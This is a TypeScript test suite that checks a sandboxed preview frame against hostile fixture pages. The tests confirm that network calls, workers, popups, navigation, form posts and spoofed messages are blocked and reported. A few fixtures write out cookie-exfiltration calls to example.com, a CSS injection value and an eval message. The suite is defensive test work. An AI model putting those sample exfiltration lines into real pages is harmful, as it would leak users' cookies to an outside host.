import { JSDOM } from 'jsdom';
import { describe, expect, it } from 'vitest';

import { buildHtmlDocument } from '../build/html';
import { buildReactDocument } from '../build/react';
import { PREVIEW_CSP, isPreviewMessage, type PreviewMessage } from './harness';

/**
 * Hostile fixtures for the preview boundary (spec §7).
 *
 * Each fixture loads a real assembled document into its own DOM and lets the page
 * run, so what is under test is the document the runtime actually writes —
 * harness included, in the position the build put it — rather than a hand-made
 * approximation of it. Its own DOM per fixture, too: the guards make themselves
 * non-writable, so a shared window would leave the second fixture testing the
 * first one's harness.
 *
 * One property matters above the rest: a blocked capability fails the way a
 * genuinely absent one fails. Returning a plausible empty success would let
 * generated code carry on as though it had data, and the page would then render
 * something that looks fine and is wrong. A warning must never mean the
 * capability was allowed, and never that the page was allowed to believe it was.
 *
 * What these cannot prove: the Content-Security-Policy and the iframe sandbox.
 * jsdom enforces neither. Those are asserted here as document content — the policy
 * directive by directive — and verified in a real frame.
 */

/* eslint-disable @typescript-eslint/no-explicit-any -- a fixture reads globals
   the page under test set, which have no type by construction. */
type PreviewWindow = JSDOM['window'] & Record<string, any>;

interface LoadedPreview {
  window: PreviewWindow;
  messages: PreviewMessage[];
  blocked: () => string[];
  detailFor: (capability: string) => string;
}

/**
 * Run a document the way the frame does. `parent` is the same window under jsdom,
 * so the harness's reports arrive as ordinary message events.
 */
function load(document: string): LoadedPreview {
  const messages: PreviewMessage[] = [];
  const dom = new JSDOM(document, {
    runScripts: 'dangerously',
    pretendToBeVisual: true,
    // Before parsing, not after. A page that reaches for the network from an
    // inline script is blocked while the document is still being built, so a
    // listener attached afterwards would miss the very reports under test.
    beforeParse(window) {
      window.addEventListener('message', (event: Event) => {
        const data = (event as MessageEvent).data;
        if (isPreviewMessage(data)) messages.push(data);
      });
    },
  });
  return {
    window: dom.window as PreviewWindow,
    messages,
    blocked: () =>
      messages.filter((message) => message.kind === 'blocked').map((message) => message.capability),
    detailFor: (capability) =>
      messages.find((message) => message.capability === capability)?.detail ?? '',
  };
}

/** A preview built from one hostile inline script. */
function loadHostileScript(script: string): LoadedPreview {
  const built = buildHtmlDocument([
    {
      name: 'index.html',
      content: `<body><main>Still renders</main><script>\ntry {\n${script}\n} catch (error) { window.thrown = String(error); }\n</script></body>`,
    },
  ]);
  return load(built.document!);
}

/** Let a rejected promise settle before the assertion looks at the result. */
const settle = () => new Promise((resolve) => setTimeout(resolve, 0));

describe('a page that tries to reach the network', () => {
  it('rejects fetch rather than resolving with nothing', async () => {
    const preview = loadHostileScript(
      `window.result = 'pending';
       fetch('https://example.com/data.json').then(
         function () { window.result = 'resolved'; },
         function (error) { window.result = 'rejected:' + error.name; }
       );`,
    );

    await settle();

    // The failure this guards: an empty response lets generated code render an
    // "empty state" as though the request had succeeded.
    expect(preview.window.result).toBe('rejected:TypeError');
    expect(preview.blocked()).toContain('fetch');
    expect(preview.detailFor('fetch')).toContain('example.com');
    // And the page the request was decorating still renders.
    expect(preview.window.document.querySelector('main')?.textContent).toBe('Still renders');
  });

  it('throws when constructing XMLHttpRequest, WebSocket or EventSource', async () => {
    for (const name of ['XMLHttpRequest', 'WebSocket', 'EventSource']) {
      const preview = loadHostileScript(`new ${name}('https://example.com');`);
      await settle();
      expect(String(preview.window.thrown), name).toContain('TypeError');
      expect(preview.blocked(), name).toContain(name);
    }
  });

  it('refuses a beacon and says it refused', async () => {
    const preview = loadHostileScript(
      `window.sent = navigator.sendBeacon('https://example.com/track');`,
    );
    await settle();

    expect(preview.window.sent).toBe(false);
    expect(preview.blocked()).toContain('navigator.sendBeacon');
  });

  it('throws when starting a worker', async () => {
    const preview = loadHostileScript(`new Worker('worker.js');`);
    await settle();

    expect(String(preview.window.thrown)).toContain('TypeError');
    expect(preview.blocked()).toContain('Worker');
  });

  it('leaves no service worker to register against', () => {
    const preview = loadHostileScript(
      `window.hasServiceWorker = navigator.serviceWorker !== undefined;`,
    );

    expect(preview.window.hasServiceWorker).toBe(false);
  });

  it('reports one blocked fetch however often the page calls it', async () => {
    const preview = loadHostileScript(
      `for (var i = 0; i < 20; i++) { fetch('https://example.com/x').catch(function () {}); }`,
    );

    await settle();

    // A render loop calling fetch every frame would otherwise bury the first,
    // real warning under hundreds of copies.
    expect(preview.blocked().filter((capability) => capability === 'fetch')).toHaveLength(1);
  });
});

describe('a page that tries to leave the frame', () => {
  it('returns null from window.open, as a blocked popup does', async () => {
    const preview = loadHostileScript(`window.opened = window.open('https://example.com');`);
    await settle();

    expect(preview.window.opened).toBeNull();
    expect(preview.blocked()).toContain('window.open');
  });

  it('stops a link from navigating the frame away', async () => {
    const built = buildHtmlDocument([
      { name: 'index.html', content: '<body><a id="out" href="https://example.com">Leave</a></body>' },
    ]);
    const preview = load(built.document!);
    const event = new preview.window.MouseEvent('click', { bubbles: true, cancelable: true });

    preview.window.document.getElementById('out')!.dispatchEvent(event);
    await settle();

    expect(event.defaultPrevented).toBe(true);
    expect(preview.blocked()).toContain('navigation');
  });

  it('leaves an in-page anchor working', async () => {
    const built = buildHtmlDocument([
      { name: 'index.html', content: '<body><a id="jump" href="#section">Jump</a></body>' },
    ]);
    const preview = load(built.document!);
    const event = new preview.window.MouseEvent('click', { bubbles: true, cancelable: true });

    preview.window.document.getElementById('jump')!.dispatchEvent(event);
    await settle();

    // An anchor within the page is ordinary behaviour, not an escape attempt, so
    // it must neither be prevented nor reported as one.
    expect(event.defaultPrevented).toBe(false);
    expect(preview.blocked()).not.toContain('navigation');
  });

  it('stops a form from submitting', async () => {
    const built = buildHtmlDocument([
      {
        name: 'index.html',
        content: '<body><form id="f" action="/somewhere"><button>Go</button></form></body>',
      },
    ]);
    const preview = load(built.document!);
    const event = new preview.window.Event('submit', { bubbles: true, cancelable: true });

    preview.window.document.getElementById('f')!.dispatchEvent(event);
    await settle();

    expect(event.defaultPrevented).toBe(true);
    expect(preview.blocked()).toContain('form submission');
  });
});

describe('a page that cannot be talked out of its guards', () => {
  it('will not let generated code restore fetch', async () => {
    const preview = loadHostileScript(
      `try {
         window.fetch = function () { return Promise.resolve({ json: function () { return {}; } }); };
       } catch (error) { window.assignThrew = true; }
       fetch('https://example.com').then(
         function () { window.result = 'resolved'; },
         function () { window.result = 'rejected'; }
       );`,
    );

    await settle();

    // Whether the assignment throws or is ignored does not matter. Taking effect
    // does: the page would then have a working network again.
    expect(preview.window.result).toBe('rejected');
  });

  it('ignores a message that is not a valid tweak', () => {
    const built = buildHtmlDocument([{ name: 'index.html', content: '<body>x</body>' }]);
    const preview = load(built.document!);

    for (const data of [
      { source: 'sero-design-preview', kind: 'tweak', cssVariable: 'colour', value: 'red' },
      { source: 'sero-design-preview', kind: 'tweak', cssVariable: '--x', value: 'red; behavior: url(x)' },
      { source: 'sero-design-preview', kind: 'tweak', cssVariable: '--x', value: 'a'.repeat(200) },
      { source: 'sero-design-preview', kind: 'tweak', cssVariable: '--x', value: 42 },
      { source: 'someone-else', kind: 'tweak', cssVariable: '--x', value: 'red' },
      { source: 'sero-design-preview', kind: 'eval', code: 'window.owned = true' },
    ]) {
      preview.window.dispatchEvent(new preview.window.MessageEvent('message', { data }));
    }

    expect(preview.window.document.documentElement.style.getPropertyValue('--x')).toBe('');
    expect(preview.window.owned).toBeUndefined();
  });

  it('accepts a plain value for a custom property', () => {
    const built = buildHtmlDocument([{ name: 'index.html', content: '<body>x</body>' }]);
    const preview = load(built.document!);

    preview.window.dispatchEvent(
      new preview.window.MessageEvent('message', {
        data: {
          source: 'sero-design-preview',
          kind: 'tweak',
          cssVariable: '--signal',
          value: '#34d399',
        },
      }),
    );

    // The only thing the frame accepts from outside: one custom property, one
    // value. Never a selector, a stylesheet or code.
    expect(preview.window.document.documentElement.style.getPropertyValue('--signal')).toBe(
      '#34d399',
    );
  });

  it('reports a script error instead of failing silently', async () => {
    const built = buildHtmlDocument([
      { name: 'index.html', content: '<body><script>undefinedFunction();</script></body>' },
    ]);
    const preview = load(built.document!);

    await settle();

    expect(preview.messages.some((message) => message.kind === 'error')).toBe(true);
  });
});

describe('the assembled document', () => {
  it('installs every guard ahead of a hostile page rather than after it', () => {
    const built = buildHtmlDocument([
      {
        name: 'index.html',
        content: `<body>
<script>fetch('https://example.com/exfiltrate?data=' + document.cookie);</script>
<main>Still renders</main>
</body>`,
      },
    ]);

    // A guard installed after generated code has already run is not a guard.
    expect(built.document!.indexOf('var SOURCE')).toBeLessThan(built.document!.indexOf('exfiltrate'));
    expect(built.document).toContain('Still renders');
  });

  it('closes every fetching directive in the policy', () => {
    // `default-src 'none'` is the claim; these are the directives people assume it
    // does not cover, stated so a later edit cannot quietly widen one.
    for (const directive of [
      "default-src 'none'",
      "connect-src 'none'",
      "frame-src 'none'",
      "child-src 'none'",
      "object-src 'none'",
      "worker-src 'none'",
      "form-action 'none'",
      "base-uri 'none'",
      "manifest-src 'none'",
    ]) {
      expect(PREVIEW_CSP).toContain(directive);
    }
    // Nothing may name a scheme or a wildcard that could reach a server.
    expect(PREVIEW_CSP).not.toMatch(/https?:/);
    expect(PREVIEW_CSP).not.toContain('*');
  });

  it('guards a React page before it mounts', async () => {
    const built = await buildReactDocument(
      [
        {
          name: 'App.tsx',
          content: `export default function App() {
  void fetch('https://example.com/exfiltrate');
  return <main>Still renders</main>;
}`,
        },
      ],
      { tailwindRuntime: async () => '/* tailwind stub */' },
    );

    expect(built.document).toContain(PREVIEW_CSP);
    expect(built.document!.indexOf('var SOURCE')).toBeLessThan(built.document!.indexOf('exfiltrate'));
  });
});
